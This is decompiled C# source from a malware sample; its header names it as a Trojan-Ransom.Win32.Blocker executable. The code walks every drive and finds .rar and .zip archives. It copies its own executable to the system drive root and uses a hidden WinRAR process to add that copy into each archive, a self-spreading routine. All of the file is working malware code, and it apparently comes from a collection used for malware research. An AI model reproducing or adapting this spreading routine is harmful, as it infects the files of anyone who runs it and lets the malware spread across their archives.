// Decompiled with JetBrains decompiler
// Type: stvn.Crunch
// Assembly: stvn, Version=2.1.0.4, Culture=neutral, PublicKeyToken=null
// MVID: 0E421347-ED83-4802-AA32-0C75CC4813FB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.aaaa-fccb1b4cd8e2d19a849bc1ed57adec47725a0f6e1cd3ec135d4ddad939386d3b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace stvn
{
  public class Crunch
  {
    private static string QWA_SOxwk192;
    private static string QWA_SOxwk1925;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern int QWA_SOxwk259(
      [MarshalAs(UnmanagedType.LPTStr)] string path,
      [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath,
      int shortPathLength);

    private static void Search(string pathName)
    {
      string[] files = Directory.GetFiles(pathName);
      int index1 = 0;
      while (index1 < files.Length)
      {
        string ouchoisir = files[index1];
        if (ouchoisir.Contains(".rar"))
          Crunch.QWA_SOxwk19212(ouchoisir);
        if (ouchoisir.Contains(".zip"))
          Crunch.QWA_SOxwk19212(ouchoisir);
        checked { ++index1; }
      }
      string[] directories = Directory.GetDirectories(pathName);
      int index2 = 0;
      while (index2 < directories.Length)
      {
        Crunch.Search(directories[index2]);
        checked { ++index2; }
      }
    }

    public static void QWA_SOxwk1929(string monendroit)
    {
      Crunch.QWA_SOxwk1925 = monendroit;
      string[] logicalDrives = Environment.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        Crunch.Search(logicalDrives[index]);
        checked { ++index; }
      }
      File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\autezzer49se.txt");
    }

    public static void QWA_SOxwk19212(string ouchoisir)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
      Crunch.QWA_SOxwk192 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
      if (!File.Exists(Crunch.QWA_SOxwk192))
        return;
      if (!File.Exists(Path.Combine(path1, Crunch.QWA_SOxwk1925)))
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, Crunch.QWA_SOxwk1925));
      StringBuilder shortPath1 = new StringBuilder((int) byte.MaxValue);
      Crunch.QWA_SOxwk259(Path.Combine(path1, Crunch.QWA_SOxwk1925), shortPath1, shortPath1.Capacity);
      string str1 = shortPath1.ToString();
      StringBuilder shortPath2 = new StringBuilder((int) byte.MaxValue);
      Crunch.QWA_SOxwk259(ouchoisir, shortPath2, shortPath2.Capacity);
      try
      {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        string str2 = " a " + Convert.ToString((object) shortPath2) + " " + str1;
        startInfo.FileName = Crunch.QWA_SOxwk192;
        startInfo.Arguments = str2;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        Process.Start(startInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
